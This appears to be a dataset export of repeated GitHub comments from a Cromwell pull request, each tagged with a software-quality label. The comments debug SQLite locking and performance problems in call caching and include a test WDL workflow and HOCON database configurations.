[cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:17,Testability,test,testing,17,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140:324,Testability,mock,mock,324,"Okay preliminary testing. On a workflow that creates multiple jobs at once I get these errors: `Failure writing to call cache: [SQLITE_BUSY] the database file is locked (database is locked)`. This has to do probably with SQLITE not supporting multiple threads or something similar. It is probably reproducible by creating a mock scatter workflow that spawns a 1000 jobs at once. To reproduce; ```WDL; version 1.0. workflow thousand_scatters {; input {}; scatter (i in range(200)) {; call hello_world {input: hello=i}; }; output {; Array[String] hellos = hello_world.out; }; }. task hello_world {; input {; String hello = ""world"" ; }; command {; echo ""Hello ~{hello}!""; }; output {; String out = stdout(); }; runtime {; docker: ""quay.io/biocontainers/samtools:1.11--h6270b1f_0""; }; }; ```. With config; ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; call-caching {; enabled=true; }; ```. I already tried if running only one akka thread would solbe it with:; ```hocon; akka {; actor.default-dispatcher.fork-join-executor {; parallelism-max = 1; }; }. ```; But this had no effect. I still get:; ```[ERROR] [11/27/2020 13:47:06.907] [cromwell-system-akka.dispatchers.engine-dispatcher-3] [akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/WorkflowExecutionActor-9f19cf8b-7b86-4c9d-9c90-0aa23817636c/9f19cf8b-7b86-4c9d-9c90-0aa23817636c-EngineJobExecutionActor-thousand_scatters.hello_world:85:1] 9f19cf8b:thousand_scatters.hello_world:85:1: Failure writing to call cache: [SQLITE_BUSY] The database file is locked (database is locked)```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734786140
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027:209,Deployability,configurat,configuration,209,"I did some further debugging and I found that cromwell creates a SlickDatabase object twice. Once for the database and once for the metadata. That is probably were the conflict comes from. Using the following configuration the metadata database is kept separate and the problem could not be reproduced anymore. I am now trying it on a production workflow on our cluster. ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell-metadata.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; }. ```. I am currently looking in how to make the metadata and engine use the same connection when they are using the same configuration. EDIT: The code hierarchy concerning both the engine database and metadata database is quite complex, it is not straightforward to share a connection. Using a separate metadatabase seems to be a faster workaround for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027:862,Deployability,configurat,configuration,862,"I did some further debugging and I found that cromwell creates a SlickDatabase object twice. Once for the database and once for the metadata. That is probably were the conflict comes from. Using the following configuration the metadata database is kept separate and the problem could not be reproduced anymore. I am now trying it on a production workflow on our cluster. ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell-metadata.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; }. ```. I am currently looking in how to make the metadata and engine use the same connection when they are using the same configuration. EDIT: The code hierarchy concerning both the engine database and metadata database is quite complex, it is not straightforward to share a connection. Using a separate metadatabase seems to be a faster workaround for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027:209,Modifiability,config,configuration,209,"I did some further debugging and I found that cromwell creates a SlickDatabase object twice. Once for the database and once for the metadata. That is probably were the conflict comes from. Using the following configuration the metadata database is kept separate and the problem could not be reproduced anymore. I am now trying it on a production workflow on our cluster. ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell-metadata.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; }. ```. I am currently looking in how to make the metadata and engine use the same connection when they are using the same configuration. EDIT: The code hierarchy concerning both the engine database and metadata database is quite complex, it is not straightforward to share a connection. Using a separate metadatabase seems to be a faster workaround for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027:862,Modifiability,config,configuration,862,"I did some further debugging and I found that cromwell creates a SlickDatabase object twice. Once for the database and once for the metadata. That is probably were the conflict comes from. Using the following configuration the metadata database is kept separate and the problem could not be reproduced anymore. I am now trying it on a production workflow on our cluster. ```hocon; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell-metadata.sqlite?foreign_keys=true&date_class=text""; numThreads=1; }; }; }. ```. I am currently looking in how to make the metadata and engine use the same connection when they are using the same configuration. EDIT: The code hierarchy concerning both the engine database and metadata database is quite complex, it is not straightforward to share a connection. Using a separate metadatabase seems to be a faster workaround for now.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-734858027
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:501,Availability,down,down,501,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:547,Availability,down,down,547,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2873,Availability,error,error,2873,"al file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no matter whether the workflow is large or small. It is a gotcha to be aware of, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1237,Deployability,Update,Update,1237,"more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initial",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2189,Deployability,configurat,configuration,2189,"erformed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2712,Deployability,configurat,configuration,2712,"al file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no matter whether the workflow is large or small. It is a gotcha to be aware of, however.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:578,Integrability,message,messages,578,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:613,Integrability,message,messages,613,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:819,Integrability,message,messages,819,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:933,Integrability,message,messages,933,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:965,Integrability,message,message,965,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:1294,Modifiability,rewrite,rewrite,1294,"more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initial",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:2189,Modifiability,config,configuration,2189,"erformed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specific use case where we are on a hpc cluster, with a slow NFS-based filesystem, with file-based databases limited to single projects, the metadata is not very interesting. Using the following configuration works very well initially:. ```HOCON; database {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite:cromwell.sqlite?foreign_keys=true&date_class=text&journal_mode=truncate""; numThreads=1; }; metadata {; profile = ""slick.jdbc.SQLiteProfile$""; db {; driver = ""org.sqlite.JDBC""; url = ""jdbc:sqlite::memory:?foreign_keys=true&date_class=text""; numThreads=1; }; }; }; ```; This limits the amount of IO operations to the bare minimum to get call-caching working. With this configuration cromwell was able to rerun the callcached 1000+ job workflow in ~25 minutes. However it crashed when it needed to write jobs failing with a SQLite error reporting no such table: `METADATA_ENTRY`. EDIT3: I found that using the SQLite in-memory database allows Cromwell to exceed limits that are set using `-Xmx=1G` for instance. I think this is acceptable, as SQLite does not create very large databases and it allows for using Cromwell with the same setting everywhere, no ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906
